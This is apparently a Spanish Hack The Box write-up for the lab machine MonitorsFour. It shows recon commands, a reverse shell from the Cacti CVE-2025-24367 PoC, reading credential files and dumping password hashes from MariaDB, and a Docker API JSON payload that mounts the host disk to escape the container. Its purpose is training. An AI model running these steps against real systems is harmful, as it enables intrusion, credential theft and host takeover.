---
layout: single
title: "HTB MonitorsFour - Writeup"
date: 2026-05-21
difficulty: Fácil
operating_system: Windows
service_hint: Cacti + CVE-2025-24367 + Docker API
tags:
  - CVE
  - Cacti
  - Docker API
  - RCE
  - Privilege Escalation
  - Fácil
summary: "Cadena de explotación: fuzzing de subdominios descubre Cacti 1.2.28, endpoint web filtra credenciales de usuario, y CVE-2025-24367 proporciona RCE autenticado como www-data. Desde el contenedor se abusa de la Docker API expuesta en la red interna para montar el filesystem del host y leer la flag de Administrador."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | Fácil |
| Tags | `CVE`, `Cacti`, `Docker API`, `RCE`, `Privilege Escalation` |

## Reconocimiento

El objetivo inicial fue descubrir los servicios expuestos en la máquina Windows. Los puertos 80 (HTTP) y 5985 (WinRM) confirmaron que el vector de entrada pasaba por la web.

Este primer escaneo localiza todos los puertos abiertos de forma rápida.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.1.174 -oG allPorts
```

Con los puertos identificados, este segundo escaneo profundiza en versiones y banners de servicio.

```bash
nmap -p80,5985 -sCV 10.129.1.174 -oN targeted
```

Los indicadores clave de esta fase fueron:

- `80/tcp` expone **nginx** con PHP 8.3.27 y redirige a `monitorsfour.htb`.
- `5985/tcp` confirma WinRM accesible, útil para acceso posterior con credenciales válidas.

## Enumeración

Una vez agregado `monitorsfour.htb` al `/etc/hosts`, el siguiente paso fue identificar las tecnologías del sitio y buscar subdominios adicionales.

Identificamos las tecnologías del sitio web con WhatWeb.

```bash
whatweb http://monitorsfour.htb/
```

Feroxbuster enumera directorios y rutas dentro de la aplicación web.

```bash
feroxbuster -u http://monitorsfour.htb -t 50
```

Wfuzz fuerza subdominios para descubrir hosts virtuales adicionales.

```bash
wfuzz -H "Host: FUZZ.monitorsfour.htb" --hc 404,403 -c --hh 138 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://monitorsfour.htb
```

El hallazgo crítico fue el subdominio `cacti.monitorsfour.htb`, que expone una instalación de **Cacti versión 1.2.28**.

![Panel de login de Cacti 1.2.28](/images/writeups/monitorsfour/Pasted image 20260521120236.png)

Descargamos la base de datos SQL de Cacti para analizar su contenido en busca de usuarios y contraseñas.

```bash
curl -s http://cacti.monitorsfour.htb/cacti/cacti.sql -o cacti.sql
```

Buscamos sentencias de inserción de usuarios en el dump SQL.

```bash
grep -i "INSERT INTO user" -n cacti.sql
```

Encontramos el hash MD5 del usuario `admin` (`21232f297a57a5a743894a0e4a801fc3`) que corresponde a `admin`, pero la contraseña ya había sido cambiada en el sistema activo.

## Explotación

Durante la enumeración web descubrimos un endpoint que filtra información de usuarios sin autenticación. Solicitamos el listado completo de usuarios con sus contraseñas hasheadas.

```bash
curl http://monitorsfour.htb/user?token=0
```

El endpoint devolvió los siguientes usuarios:

| Username | Rol | Nombre |
|----------|-----|--------|
| `admin` | super user | Marcus Higgins |
| `mwatson` | user | Michael Watson |
| `janderson` | user | Jennifer Anderson |
| `dthompson` | user | David Thompson |

El nombre real de `admin` era **Marcus Higgins**, lo que sugería que el usuario local `marcus` podía existir en el sistema. Probamos credenciales contra Cacti y el usuario `marcus` con contraseña `[REDACTED]` funcionó.

Con acceso autenticado a Cacti 1.2.28, identificamos que es vulnerable a **CVE-2025-24367**, una vulnerabilidad de ejecución remota de comandos (RCE) autenticada. Clonamos el PoC disponible.

```bash
git clone https://github.com/SoftAndoWetto/CVE-2025-24367-PoC-Cacti.git
```

Ejecutamos el exploit proporcionando las credenciales de `marcus` y nuestra IP para la shell reversa.

```bash
python3 exploit.py
```

El exploit se conecta a Cacti, sube un payload PHP mediante la manipulación de plantillas y desencadena la shell reversa.

Iniciamos un listener para recibir la conexión del contenedor víctima.

```bash
nc -nlvp 4444
```

```bash
connect to [10.10.14.150] from (UNKNOWN) [10.129.2.62] 65007
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

Una vez dentro del contenedor, leemos el archivo de entorno de la aplicación para encontrar credenciales de base de datos.

```bash
www-data@821fbd6a43fa:~/html/cacti$ cat /var/www/app/.env
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=[REDACTED]
```

También revisamos la configuración de Cacti para obtener las credenciales de la base de datos de Cacti.

```bash
www-data@821fbd6a43fa:~/html/cacti$ grep -Ei "user|pass|host|database|db_|mysql|mysqli|port" /var/www/html/cacti/include/config.php
```

```bash
www-data@821fbd6a43fa:~/html/cacti$ mysql -h mariadb -u cactidbuser -p
Enter password:
```

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> USE cacti;

MariaDB [cacti]> SELECT id,username,password FROM user_auth;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | admin    | $2y$10$wqlo06C4isr4q9xhqI/UQOpyM/n8EDzYl/GndqhDh/2LQihzPdHWO |
|  3 | guest    | 43e9a4ab75570f5b                                             |
|  4 | marcus   | $2y$10$bPWlnZYLhoDUawu4x8vLAuCIaDbqIUe4s9t9HqFm/1gtbavD/eKGe |
+----+----------+--------------------------------------------------------------+
```

## Flags

```bash
www-data@821fbd6a43fa:~/html/cacti$ cat /home/marcus/user.txt
9b3af7e5094c885ccfad7b115587df41
```

**Flag de usuario:** `9b3af7e5094c885ccfad7b115587df41`

## Escalada de privilegios

Desde el contenedor no tenemos acceso directo al sistema Windows host, pero podemos explorar la red interna Docker. Creamos un script para escanear el rango interno en busca de Docker API expuesto sin autenticación.

```bash
www-data@821fbd6a43fa:/tmp$ cat << 'EOF' > scan.sh
for i in $(seq 1 254); do
  ip="192.168.65.$i"
  timeout 1 bash -c "
    curl -s http://$ip:2375/version | grep -q 'ApiVersion'
  " 2>/dev/null && echo "[+] Docker API OPEN: $ip:2375"
done
EOF
```

Damos permisos de ejecución y lanzamos el escáner.

```bash
www-data@821fbd6a43fa:/tmp$ chmod +x scan.sh
www-data@821fbd6a43fa:/tmp$ ./scan.sh
[+] Docker API OPEN: 192.168.65.7:2375
```

El host `192.168.65.7:2375` tiene la Docker API expuesta sin autenticación. Esta exposición se debe al **CVE-2025-9074**, una vulnerabilidad crítica (CVSS 9.3) en Docker Desktop que permite a cualquier contenedor Linux acceder al motor Docker a través de la subred interna `192.168.65.0/24` sin necesidad de montar el socket de Docker, posibilitando la creación de contenedores privilegiados que montan el sistema de archivos del host. Listamos las imágenes disponibles.

```bash
www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
"RepoTags":["docker_setup-nginx-php:latest"]
"RepoTags":["docker_setup-mariadb:latest"]
"RepoTags":["alpine:latest"]
```

Creamos un payload JSON que monta el sistema de archivos del host dentro de un contenedor Alpine y lee la flag de Administrador.

```bash
www-data@821fbd6a43fa:/tmp$ nano payload.json
```

```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

Iniciamos un servidor HTTP para transferir el payload desde nuestra máquina atacante.

```bash
python3 -m http.server 8000
```

Descargamos el payload en la máquina víctima.

```bash
www-data@821fbd6a43fa:/tmp$ curl http://10.10.14.150:8000/payload.json -o /tmp/payload.json
```

Creamos un contenedor con el payload que monta el disco del host.

```bash
www-data@821fbd6a43fa:/tmp$ curl -X POST -H "Content-Type: application/json" -d @/tmp/payload.json http://192.168.65.7:2375/containers/create?name=pwned
{"Id":"20dd4fc655bd666d5207249c937cbe951107cdd5b68b7f89e67feafe354731d4","Warnings":[]}
```

Iniciamos el contenedor para ejecutar el comando.

```bash
www-data@821fbd6a43fa:/tmp$ curl -X POST http://192.168.65.7:2375/containers/20dd4fc655bd/start
```

Leemos los logs del contenedor para obtener la salida del comando, que contiene la flag de root.

```bash
www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/containers/20dd4fc655bd/logs?stdout=true
357b896e8498f073afb1d392deae9076
```

**Flag de root:** `357b896e8498f073afb1d392deae9076`

## Conclusión

MonitorsFour resultó ser una máquina de dificultad **Fácil** que combinó dos vectores: la explotación de Cacti 1.2.28 mediante **CVE-2025-24367** para obtener acceso a un contenedor web, y el abuso de una **Docker API expuesta sin autenticación** en la red interna para montar el sistema de archivos del host y leer la flag de Administrador. La lección principal es que exponer un panel de Cacti en una versión vulnerable combinado con una API de Docker abierta convierte una intrusión web limitada en compromiso total del sistema.
